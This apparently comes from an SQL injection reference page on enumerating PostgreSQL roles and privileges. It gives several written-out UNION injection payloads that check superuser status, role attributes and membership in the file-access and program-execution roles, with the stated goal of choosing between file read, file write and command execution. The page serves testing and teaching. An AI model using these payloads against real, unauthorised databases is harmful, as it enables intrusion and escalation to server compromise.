---
title: "Enumerating roles and privileges in PostgreSQL injection"
description: "Reading the current PostgreSQL role, its superuser status, and its grants, to decide whether file and command execution primitives are reachable."
keywords:
  - PostgreSQL privileges
  - is_superuser
  - pg_roles
  - has_table_privilege
  - pg_read_server_files
---

# Privileges

The role behind the injection decides how far it goes, so privilege enumeration follows fingerprinting. The headline question is superuser status:

```sql
' UNION SELECT current_setting('is_superuser'),NULL,NULL-- 
' UNION SELECT string_agg(rolname,','),NULL,NULL FROM pg_roles WHERE rolsuper-- 
```

A superuser can read and write server files and run programs directly. The role attribute columns in `pg_roles` (`rolsuper`, `rolcreaterole`, `rolcreatedb`, `rolbypassrls`) show what the current role can do:

```sql
' UNION SELECT string_agg(rolname||':'||rolsuper::text||':'||rolcreaterole::text,','),NULL,NULL FROM pg_roles-- 
```

On PostgreSQL 11 and later, file and program access is also granted through the predefined roles `pg_read_server_files`, `pg_write_server_files`, and `pg_execute_server_program`, so a non-superuser that belongs to one of them still reaches that primitive. Test membership with `pg_has_role`, which follows nested role grants (a direct `pg_auth_members` join would miss a privilege inherited through an intermediate role):

```sql
' UNION SELECT pg_has_role('pg_read_server_files','USAGE')::text||','||pg_has_role('pg_write_server_files','USAGE')::text||','||pg_has_role('pg_execute_server_program','USAGE')::text,NULL,NULL-- 
```

Object-level grants come from the `has_*_privilege` functions and `information_schema.role_table_grants`, for example `has_table_privilege('users','SELECT')`. Knowing the role and its grants tells you whether to pursue file read, file write, command execution, or to stay with pure data extraction.

## References

- PostgreSQL Documentation: `pg_roles`, predefined roles, access privilege functions
- OWASP Testing Guide: Testing for SQL Injection
